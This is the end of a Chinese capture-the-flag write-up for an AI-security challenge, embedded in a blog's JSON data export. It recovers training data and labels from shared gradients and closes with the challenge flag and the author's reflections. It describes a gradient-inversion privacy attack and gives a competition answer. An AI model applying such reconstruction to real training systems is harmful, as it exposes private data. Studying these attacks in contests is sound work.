\n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"14.png\"\n                      alt=\"14\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"15.png\"\n                      alt=\"15\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"16.png\"\n                      alt=\"16\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"17.png\"\n                      alt=\"17\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"18.png\"\n                      alt=\"18\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"19.png\"\n                      alt=\"19\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"20.png\"\n                      alt=\"20\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"21.png\"\n                      alt=\"21\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"22.png\"\n                      alt=\"22\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"23.png\"\n                      alt=\"23\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"24.png\"\n                      alt=\"24\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"25.png\"\n                      alt=\"25\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"26.png\"\n                      alt=\"26\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"27.png\"\n                      alt=\"27\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"28.png\"\n                      alt=\"28\" style=\"zoom:25%;\" \n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"29.png\"\n                      alt=\"29\" style=\"zoom:25%;\" \n                ><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"30.png\"\n                      alt=\"30\" style=\"zoom:25%;\" \n                ></p>\n<p>数据处理的比较乱。。。</p>\n<p>恢复出来发现并不是顺序可读的flag。</p>\n<p>想到了用时间判断梯度生成的先后，结果发现精确到毫秒级所有样本都是一模一样的。然后问ai说可以通过损失判断训练的先后，因为损失一般是收敛的，但并没有观察出什么规律。又莫名其妙发现.grad可以解压，有个serialization_id，还以为和梯度顺序有关，但其实只是训练设备的标号。最后才知道顺序和标签有关——</p>\n<p>（又重新训了一遍数据看标签的值）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 6. 输出恢复标签</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> torch.no_grad():</span><br><span class=\"line\">    final_probs = F.softmax(dummy_label, dim=-<span class=\"number\">1</span>)</span><br><span class=\"line\">    recovered_class = torch.argmax(final_probs, dim=-<span class=\"number\">1</span>).item()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;Recovered class label:&quot;</span>, recovered_class)</span><br></pre></td></tr></table></figure>\n<p>这个标签代表了梯度的顺序。</p>\n<p>需要注意的是，如果迭代时损失比较大，可能就不能使标签收敛到正确的值。所以也需要再调整迭代次数重新训练。</p>\n<p>因为数据处理的比较乱，则列了一个表格记录标签值</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504224517508.png\"\n                      alt=\"image-20250504224517508\"\n                ></p>\n<p>最后一个样本在恢复标签值时始终找不到合适的迭代次数，但好在通过标签值排序后已经恢复出了flag的大意：R1ck likes ai security，所以便没有重新训练该样本。</p>\n<p>历经千辛万苦得到了flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;R1ck_iik35_41_53cur17y&#125;</span><br></pre></td></tr></table></figure>\n<p>虽然课没好好上，但是通过这次ai安全的题目感觉把之前欠的都补回来了。</p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>在比赛中的成长只有靠写WP才能沉淀。但是太拖延了几乎比完赛才开始动笔写。</p>\n<p>虽然只能做做简单题，但是能坚持在五一打比赛已经很了不起了😭😭👍</p>\n<p>相比去年只做出一道题，今年进步也算不小了，虽然有不少的功劳出自ai和出题人。（出题人们真的好强，真是学到了不少东西）</p>\n<p>感谢队友的鼎力相助，看到队友能挑战pwn题和hard题——仰慕.jpg</p>\n<p>比赛过的很快，五一也过得很快。是时候该补作业了。</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>压线过二等。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"list.png\"\n                      alt=\"alt text\"\n                ></p>\n","_processedHighlight":true}],"PostAsset":[{"_id":"source/_posts/BUUCTF-reverse/8e4bbdacde59d80c8db2706f79dca28.png","post":"cmamofqz200028otkdw8idd0v","slug":"8e4bbdacde59d80c8db2706f79dca28.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/9e648f5389fd8773bc25dc43ff5c516.png","post":"cmamofqz200028otkdw8idd0v","slug":"9e648f5389fd8773bc25dc43ff5c516.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/check.png","post":"cmamofqz200028otkdw8idd0v","slug":"check.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/ida1.png","post":"cmamofqz200028otkdw8idd0v","slug":"ida1.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/ida2.png","post":"cmamofqz200028otkdw8idd0v","slug":"ida2.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack1.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack1.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack2.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack2.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack3.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack3.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack4.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack4.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack5.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack5.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpack6.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpack6.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/unpackbytool.png","post":"cmamofqz200028otkdw8idd0v","slug":"unpackbytool.png","modified":1,"renderable":0},{"_id":"source/_posts/BUUCTF-reverse/xor1.png","post":"cmamofqz200028otkdw8idd0v","slug":"xor1.png","modified":1,"renderable":0},{"_id":"source/_posts/A-new-journey/2025.03.07_08.56.36.jpg","post":"cmamofqz300038otk7oohelm6","slug":"2025.03.07_08.56.36.jpg","modified":1,"renderable":0},{"_id":"source/_posts/A-new-journey/dns.jpg","post":"cmamofqz300038otk7oohelm6","slug":"dns.jpg","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/1.png","post":"cmamofqz500058otk2yk817wq","slug":"1.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/10.png","post":"cmamofqz500058otk2yk817wq","slug":"10.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/11.png","post":"cmamofqz500058otk2yk817wq","slug":"11.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/12.png","post":"cmamofqz500058otk2yk817wq","slug":"12.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/13.png","post":"cmamofqz500058otk2yk817wq","slug":"13.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/14.png","post":"cmamofqz500058otk2yk817wq","slug":"14.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/15.png","post":"cmamofqz500058otk2yk817wq","slug":"15.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/16.png","post":"cmamofqz500058otk2yk817wq","slug":"16.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/17.png","post":"cmamofqz500058otk2yk817wq","slug":"17.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/18.png","post":"cmamofqz500058otk2yk817wq","slug":"18.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/19.png","post":"cmamofqz500058otk2yk817wq","slug":"19.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/2.png","post":"cmamofqz500058otk2yk817wq","slug":"2.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/20.png","post":"cmamofqz500058otk2yk817wq","slug":"20.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/21.png","post":"cmamofqz500058otk2yk817wq","slug":"21.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/22.png","post":"cmamofqz500058otk2yk817wq","slug":"22.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/23.png","post":"cmamofqz500058otk2yk817wq","slug":"23.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/24.png","post":"cmamofqz500058otk2yk817wq","slug":"24.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/25.png","post":"cmamofqz500058otk2yk817wq","slug":"25.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/26.png","post":"cmamofqz500058otk2yk817wq","slug":"26.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/27.png","post":"cmamofqz500058otk2yk817wq","slug":"27.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/28.png","post":"cmamofqz500058otk2yk817wq","slug":"28.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/29.png","post":"cmamofqz500058otk2yk817wq","slug":"29.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/3.png","post":"cmamofqz500058otk2yk817wq","slug":"3.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/30.png","post":"cmamofqz500058otk2yk817wq","slug":"30.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/31.png","post":"cmamofqz500058otk2yk817wq","slug":"31.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/32.png","post":"cmamofqz500058otk2yk817wq","slug":"32.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/4.png","post":"cmamofqz500058otk2yk817wq","slug":"4.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/5.png","post":"cmamofqz500058otk2yk817wq","slug":"5.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/6.png","post":"cmamofqz500058otk2yk817wq","slug":"6.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/7.png","post":"cmamofqz500058otk2yk817wq","slug":"7.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/8.png","post":"cmamofqz500058otk2yk817wq","slug":"8.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/9.png","post":"cmamofqz500058otk2yk817wq","slug":"9.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250503175742770.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250503175742770.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504162719128.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504162719128.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504162835758.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504162835758.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504163921288.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504163921288.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504164403519.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504164403519.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504164803915.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504164803915.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504165220376.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504165220376.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504170855720.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504170855720.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504172003259.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504172003259.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504172338683.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504172338683.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504203337339.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504203337339.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504223254918.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504223254918.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/image-20250504224517508.png","post":"cmamofqz500058otk2yk817wq","slug":"image-20250504224517508.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/list.png","post":"cmamofqz500058otk2yk817wq","slug":"list.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193131.jpg","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193131.jpg","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193140.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193140.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193150.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193150.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193205.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193205.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193213.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193213.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193217.jpg","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193217.jpg","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193223.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193223.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503193419.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503193419.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503194002.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503194002.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503194142.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503194142.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503194538.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503194538.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503194610.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503194610.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503195004.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503195004.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503195311.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503195311.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503200140.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503200140.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503200530.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503200530.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250503204222.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250503204222.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504135809.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504135809.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504140529.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504140529.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504140829.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504140829.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504155416.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504155416.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504155524.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504155524.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504155559.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504155559.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504155659.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504155659.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504155944.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504155944.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504160101.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504160101.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504160243.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504160243.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504160419.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504160419.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504160818.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504160818.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504163434.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504163434.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504170803.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504170803.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250504203331.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250504203331.png","modified":1,"renderable":0},{"_id":"source/_posts/W4terCTF-2025/微信图片_20250505110938.png","post":"cmamofqz500058otk2yk817wq","slug":"微信图片_20250505110938.png","modified":1,"renderable":0}],"PostCategory":[],"PostTag":[{"post_id":"cmamofqz200028otkdw8idd0v","tag_id":"cmamofqz400048otkfda33dvj","_id":"cmamofqz600078otk6flkfnlr"},{"post_id":"cmamofqz500058otk2yk817wq","tag_id":"cmamofqz400048otkfda33dvj","_id":"cmamofqz600088otkg0ho60h8"}],"Tag":[{"name":"CTF","_id":"cmamofqz400048otkfda33dvj"}]}}